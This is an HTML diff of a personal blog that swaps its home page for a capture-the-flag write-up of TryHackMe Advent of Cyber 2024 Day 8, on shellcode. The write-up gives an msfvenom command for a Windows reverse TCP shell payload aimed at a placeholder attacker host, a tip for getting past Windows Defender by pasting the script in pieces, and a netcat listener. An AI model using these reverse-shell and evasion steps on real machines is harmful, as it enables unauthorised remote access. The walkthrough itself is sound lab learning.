@@ -67,7 +67,7 @@
     <link href="https://unpkg.com/prismjs@1.20.0/themes/prism-okaidia.css" rel="stylesheet" >
     
 
-    <title>Home | Stefanos M.</title>
+    <title>Advent of Cyber 2024 - Day 8 | Stefanos M.</title>
 </head>
 	<body class="Ribbon" id='Body'>
 		<div>
@@ -98,38 +98,22 @@
 			</div>
 
 			<div class="seperator" id="Content">
-				
-<div class="page" id="Page">
-
-	<h2>Home</h2>
-<h3>What is the purpose of this site?</h3>
-<p>This site will primarily function as a personal portfolio to highlight my projects and any scientific papers I may publish. Additionally, it will serve as a repository for my resume and other certifications, making them easily accessible to recruiters.</p>
-<p>All the projects featured here are created during my free time. While tips are not required, they would be greatly appreciated as a gesture of support!</p>
-<script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Support me on Ko-fi', '#8d2c3e', 'X8X417UEDG');kofiwidget2.draw();</script> 
-<h3>How is this site built?</h3>
-<p>In the backend before the site is built into a static site we are using <a href="https://www.11ty.dev/">Eleventy (11ty)</a> that has recently joined <a href="https://fontawesome.com/">Font Awesome</a> which infact is the service that I use for the social media icons on the footer. For bundling JavaScript code we are using <a href="https://www.npmjs.com/package/webpack">Webpack</a> that bundles all the code in one file.</p>
-
-
-	<h2> Most recent posts: </h2>
-	
-		<ul>
-			<li> On: Thu, Dec 19, 24, <a href="/posts/Blog/2024-12-19-Small-pause-on-aoc-posts/">A small pause in uploading posts for AoC 2024</a> by: Stefanos Margaritis</li>
-		</ul>
-	
-		<ul>
-			<li> On: Sun, Dec 01, 24, <a href="/posts/Blog/2024-12-01-Advent-of-Cyber/">Advent of Cyber 2024 By TryHackMe</a> by: Stefanos Margaritis</li>
-		</ul>
-	
-		<ul>
-			<li> On: Sat, Nov 09, 24, <a href="/posts/Blog/2024-11-09-WordCamp-Larisa-2024/">WordCamp Larisa 2024</a> by: Stefanos Margaritis</li>
-		</ul>
-	
-		<ul>
-			<li> On: Sun, Oct 20, 24, <a href="/posts/Blog/2024-10-27-Rewrite-in-11ty/">My experience with 11ty as a static site generator.</a> by: Stefanos Margaritis</li>
-		</ul>
-	
-</div>
-
+				<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg">
+<h2>Advent of Cyber 2024 - Day 8</h2>
+<h3>Topic Covered Day 8: Shellcode</h3>
+<p>She sells sea shells at the shellcode cove!</p>
+<p>Todays topic was shellcodes; a piece of code that is injected into vulnerable systems in order to trigger the execution of arbitary commands. With the shellcodes our tasks where to get a reverse shell to a windows machine with PowerShell.</p>
+<p>To generate the shellcode we are instructed to use <code>msfvernom</code> first at port 1111 and then at the attack port 4444 and make it connect to our machine with the ip of the AttackBox.</p>
+<pre class="language-bash"><code class="language-bash">msfvernom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACK_BOX_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> powershell</code></pre>
+<p>That line would generate a hex encoded byte array that we would paste into our given powerShell code that would deliver the payload. Fun fact! If you put the code in a <code>.ps1</code> file (powershell script) Windows Defender would infact pick it up and stop you from running it! So get ready for <code>Ctrl+C</code> and <code>Ctrl+V</code> price by piece since you gotta make it in steps.</p>
+<p>If you have an issue with the clipboard not pasting right is would recommend at home directory to run</p>
+<pre class="language-bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server</code></pre>
+<p>so you will be able to see and download the files from the attack box to the target machine. Important step was to start netcat at the attack box by running the below command so you could initiate the reverse shell!</p>
+<pre class="language-bash"><code class="language-bash">netcat <span class="token parameter variable">-nvlp</span> <span class="token number">4444</span></code></pre>
+<p>Where you to run all the scripts without having the powershell crash, you would be getting a successfull reverse shell and on the terminal running netcat, you would see that you now have a powershell into the target machine. To get the flag all you have to do is navigate to the Desktop and run <code>type</code> on the flag thus getting the flag and completing Day 8.</p>
+<pre class="language-powershell"><code class="language-powershell">cd Desktop
+<span class="token function">type</span> flag<span class="token punctuation">.</span>txt</code></pre>
+<p>This was fun, learned something new and got my 7 day Streak sticker! Can't wait for Day 9!</p>
 
 			</div>
 
